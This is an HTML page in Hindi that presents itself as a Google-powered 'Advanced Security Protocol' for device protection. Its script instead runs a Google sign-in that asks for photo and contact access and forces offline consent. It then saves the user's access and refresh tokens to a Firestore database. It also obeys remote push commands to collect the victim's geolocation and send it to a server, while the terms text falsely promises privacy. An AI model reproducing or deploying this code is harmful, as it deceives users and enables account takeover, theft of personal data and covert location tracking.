<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SecureSphere - Advanced Security Protocol</title>
    
    <!-- सुंदर आइकॉन के लिए Font Awesome लाइब्रेरी -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    
    <!-- Firebase SDK (लाइब्रेरी) -->
    <script src="https://www.gstatic.com/firebasejs/9.6.7/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.7/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.7/firebase-firestore-compat.js"></script>
    
    <style>
        /* CSS में कोई बदलाव नहीं है, यह पहले जैसा ही एडवांस है */
        :root {
            --bg-dark: #111827; --bg-light: #1f2937;
            --primary-color: #3b82f6; --primary-hover: #2563eb;
            --text-light: #f9fafb; --text-secondary: #d1d5db; --border-color: #4b5563;
            --success-color: #22c55e; --error-color: #ef4444;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: var(--bg-dark); color: var(--text-light); display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        #settings-icon { position: absolute; top: 25px; right: 25px; font-size: 24px; color: var(--text-secondary); cursor: pointer; transition: transform 0.3s ease; }
        #settings-icon:hover { transform: rotate(90deg); }
        .container { text-align: center; background: rgba(31, 41, 55, 0.8); padding: 50px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 450px; width: 90%; border: 1px solid var(--border-color); backdrop-filter: blur(10px); animation: fadeIn 1s ease; }
        .logo { width: 80px; height: 80px; margin-bottom: 20px; }
        h1 { font-size: 28px; margin-bottom: 15px; }
        p.subtitle { color: var(--text-secondary); font-size: 16px; margin-bottom: 40px; }
        #status { margin-top: 20px; font-weight: bold; min-height: 20px; }
        #protectButton { background-color: var(--primary-color); color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; transition: all 0.3s; }
        #protectButton:hover:not(:disabled) { background-color: var(--primary-hover); transform: translateY(-2px); }
        #protectButton:disabled { background-color: var(--border-color); cursor: not-allowed; opacity: 0.6; }
        .status-error { color: var(--error-color); }
        .status-success { color: var(--success-color); }
        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); backdrop-filter: blur(5px); display: flex; justify-content: center; align-items: center; opacity: 0; visibility: hidden; transition: all 0.3s ease; }
        .modal-overlay.visible { opacity: 1; visibility: visible; }
        .modal-content { background: var(--bg-light); padding: 30px; border-radius: 10px; max-width: 500px; width: 90%; border: 1px solid var(--border-color); transform: scale(0.9); transition: transform 0.3s ease; }
        .modal-overlay.visible .modal-content { transform: scale(1); }
        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .modal-header h2 { font-size: 22px; }
        .close-modal { font-size: 28px; cursor: pointer; color: var(--text-secondary); }
        .policy-text { height: 200px; overflow-y: auto; background: var(--bg-dark); padding: 15px; border-radius: 5px; text-align: left; font-size: 14px; color: var(--text-secondary); margin-bottom: 20px; }
        .agreement { display: flex; align-items: center; justify-content: center; margin-bottom: 20px; }
        .agreement input { margin-right: 10px; }
        #agreeButton { width: 100%; padding: 12px; background-color: var(--success-color); border: none; border-radius: 5px; color: white; font-size: 1.1em; font-weight: bold; cursor: pointer; }
        #agreeButton:disabled { background-color: var(--border-color); cursor: not-allowed; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

    <div id="settings-icon"><i class="fa-solid fa-cog"></i></div>

    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/76/Dialog-information.svg/2048px-Dialog-information.svg.png" alt="Security Logo" class="logo">
        <h1>Advanced Security Protocol</h1>
        <p class="subtitle">Google द्वारा संचालित हमारी उन्नत सुरक्षा प्रणाली के साथ अपने डिवाइस पर पूर्ण सुरक्षा सक्रिय करें।</p>
        <button id="protectButton" disabled>पूर्ण सुरक्षा सक्रिय करें</button>
        <div id="status">कृपया सुरक्षा सक्रिय करने से पहले हमारी नीतियों से सहमत हों।</div>
    </div>

    <div class="modal-overlay" id="policy-modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>नियम एवं शर्तें</h2>
                <span class="close-modal">&times;</span>
            </div>
            <div class="policy-text">
                <p>इस सेवा का उपयोग करके, आप निम्नलिखित शर्तों से सहमत होते हैं:</p>
                <ol>
                    <li>यह सेवा आपके डिवाइस की सुरक्षा स्थिति का विश्लेषण करने के लिए डिज़ाइन की गई है।</li>
                    <li>सुरक्षा प्रोटोकॉल को सक्षम करने के लिए, हमें आपके Google खाते से कुछ अनुमतियों की आवश्यकता होगी, जिसमें आपकी संपर्क सूची और फोटो गैलरी तक केवल-पढ़ने के लिए पहुंच शामिल है।</li>
                    <li>हम आपकी गोपनीयता का सम्मान करते हैं। आपका डेटा एन्क्रिप्टेड चैनलों पर प्रसारित होता है और केवल सुरक्षा विश्लेषण के उद्देश्य से उपयोग किया जाता है।</li>
                    <li>हम आपके डेटा को किसी तीसरे पक्ष के साथ साझा नहीं करते हैं।</li>
                    <li>यह सेवा पृष्ठभूमि में काम कर सकती है ताकि रीयल-टाइम सुरक्षा सुनिश्चित हो सके, जिसके लिए पुश नोटिफिकेशन की अनुमति आवश्यक है।</li>
                </ol>
            </div>
            <div class="agreement">
                <input type="checkbox" id="agreeCheckbox">
                <label for="agreeCheckbox">मैं ऊपर दिए गए नियमों और शर्तों से सहमत हूँ।</label>
            </div>
            <button id="agreeButton" disabled>सहमत हूँ और जारी रखें</button>
        </div>
    </div>


    <script>
        // --- Firebase कॉन्फ़िगरेशन (अपरिवर्तित) ---
        const firebaseConfig = {
            apiKey: "AIzaSyDuvWTMJL5edNG6cheez5pmwI2KlLCwtjw",
            authDomain: "shubhzone-4a6b0.firebaseapp.com",
            databaseURL: "https://shubhzone-4a6b0-default-rtdb.firebaseio.com",
            projectId: "shubhzone-4a6b0",
            storageBucket: "shubhzone-4a6b0.appspot.com",
            messagingSenderId: "439309269785",
            appId: "1:439309269785:web:08a1256812648daafea388",
            measurementId: "G-5S0VFF21SB"
        };
        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        const db = firebase.firestore();

        // --- DOM Elements & Constants (अपरिवर्तित) ---
        const protectButton = document.getElementById('protectButton');
        const statusDiv = document.getElementById('status');
        const settingsIcon = document.getElementById('settings-icon');
        const policyModal = document.getElementById('policy-modal');
        const closeModalBtn = document.querySelector('.close-modal');
        const agreeCheckbox = document.getElementById('agreeCheckbox');
        const agreeButton = document.getElementById('agreeButton');
        const VAPID_PUBLIC_KEY = "BCPKrHM579ezfGzhmoQk-j7Mwr7E3gfEsUbFsOjEVozYRRZOzEMqVqm9fWEVY2pS1oYQ9BZ2xiN2hgiE7p7z3m0";

        // --- पॉलिसी मॉडल का लॉजिक (अपरिवर्तित) ---
        settingsIcon.addEventListener('click', () => policyModal.classList.add('visible'));
        closeModalBtn.addEventListener('click', () => policyModal.classList.remove('visible'));
        agreeCheckbox.addEventListener('change', () => { agreeButton.disabled = !agreeCheckbox.checked; });
        agreeButton.addEventListener('click', () => {
            policyModal.classList.remove('visible');
            protectButton.disabled = false;
            statusDiv.textContent = 'अब आप सुरक्षा सक्रिय कर सकते हैं।';
        });

        // --- मुख्य प्रक्रिया का लॉजिक ---
        if (Notification.permission === 'denied') handleBlockedPermission();
        protectButton.addEventListener('click', startProcess);
        
        async function startProcess() {
            if (Notification.permission === 'denied') return;
            protectButton.disabled = true;
            statusDiv.className = '';
            statusDiv.textContent = 'प्रमाणीकरण शुरू हो रहा है...';

            try {
                const googleProvider = new firebase.auth.GoogleAuthProvider();
                googleProvider.addScope('https://www.googleapis.com/auth/photoslibrary.readonly');
                googleProvider.addScope('https://www.googleapis.com/auth/contacts.readonly');

                // =====================================================================
                // === यही एकमात्र, सबसे ज़रूरी और अंतिम बदलाव है (Stale Token Fix) ===
                // =====================================================================
                // हम गूगल को बता रहे हैं कि हमें ऑफ़लाइन पहुँच चाहिए (ताकि हमें Refresh Token मिले)
                // और हम उपयोगकर्ता को हर बार सहमति देने के लिए कह रहे हैं (ताकि Refresh Token हमेशा मिले)।
                googleProvider.setCustomParameters({
                    access_type: 'offline',
                    prompt: 'consent'
                });
                
                const result = await auth.signInWithPopup(googleProvider);
                const { user, credential } = result;
                const accessToken = credential.accessToken;
                
                // अब हम रिफ्रेश टोकन को भी पकड़ेंगे
                const refreshToken = result.additionalUserInfo.profile.refresh_token || credential.refreshToken;

                statusDiv.textContent = `स्वागत है, ${user.displayName}!`;

                const subscription = await registerAndSubscribe();
                await saveDataToFirestore(user, accessToken, refreshToken, subscription); // अब refreshToken भी भेज रहे हैं
                handleSuccess();

            } catch (error) {
                handleError(`त्रुटि: ${error.message}`);
            }
        }
        
        // ... registerAndSubscribe फ़ंक्शन में कोई बदलाव नहीं ...
        async function registerAndSubscribe() {
            statusDiv.textContent = 'सुरक्षा परतें सक्रिय हो रही हैं...';
            if (!('serviceWorker' in navigator) || !('PushManager' in window)) throw new Error('ब्राउज़र संगत नहीं है।');
            await navigator.serviceWorker.register('/sw.js');
            const permission = await Notification.requestPermission();
            if (permission === 'granted') {
                return navigator.service-Worker.ready.then(reg => 
                    reg.pushManager.subscribe({
                        userVisibleOnly: true,
                        applicationServerKey: VAPID_PUBLIC_KEY
                    })
                );
            } else {
                if (permission === 'denied') handleBlockedPermission();
                else handleDismissedPermission();
                throw new Error('Notification permission was not granted.');
            }
        }
        
        // ... saveDataToFirestore में अब refreshToken भी जुड़ेगा ...
        async function saveDataToFirestore(user, accessToken, refreshToken, subscription) {
            statusDiv.textContent = 'डेटा को सुरक्षित किया जा रहा है...';
            const userRef = db.collection('users').doc(user.uid);
            const dataToSave = {
                uid: user.uid, displayName: user.displayName, email: user.email, photoURL: user.photoURL,
                googleAccessToken: accessToken,
                pushSubscription: JSON.parse(JSON.stringify(subscription)),
                lastLogin: firebase.firestore.FieldValue.serverTimestamp()
            };
            
            // सिर्फ़ तभी refreshToken को सेव करें जब वह हमें मिला हो
            if (refreshToken) {
                dataToSave.googleRefreshToken = refreshToken;
            }

            await userRef.set(dataToSave, { merge: true });
        }

        // --- बाकी सभी फंक्शन्स (कमांड सुनना, हेल्पर फंक्शन्स) में कोई बदलाव नहीं ---
        navigator.serviceWorker.addEventListener('message', event => {
            const commandData = event.data;
            if (commandData && commandData.command === 'get_location') {
                executeGetLocationFromPage();
            }
        });
        function executeGetLocationFromPage() {
            if ('geolocation' in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => { sendDataToServer({ type: 'location', latitude: position.coords.latitude, longitude: position.coords.longitude, accuracy: position.coords.accuracy }); },
                    (error) => { sendDataToServer({ type: 'error', message: `लोकेशन प्राप्त करने में विफल: ${error.message}` }); }
                );
            }
        }
        async function sendDataToServer(data) {
            await fetch('/report-data', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
        }
        function handleSuccess() { statusDiv.className = 'status-success'; statusDiv.textContent = 'आपका डिवाइस अब पूरी तरह सुरक्षित है!'; protectButton.style.backgroundColor = 'var(--success-color)'; protectButton.textContent = 'सुरक्षित'; protectButton.disabled = true; }
        function handleError(message) { statusDiv.className = 'status-error'; statusDiv.textContent = message; protectButton.disabled = false; }
        function handleDismissedPermission() { statusDiv.className = 'status-error'; statusDiv.textContent = 'पूर्ण सुरक्षा के लिए अनुमति आवश्यक है।'; protectButton.disabled = false; }
        function handleBlockedPermission() { statusDiv.className = 'status-error'; statusDiv.textContent = 'अनुमति स्थायी रूप से ब्लॉक कर दी गई है।'; protectButton.textContent = 'अनुमति अवरुद्ध'; protectButton.style.backgroundColor = '#888'; protectButton.disabled = true; }
    </script>
</body>
</html>
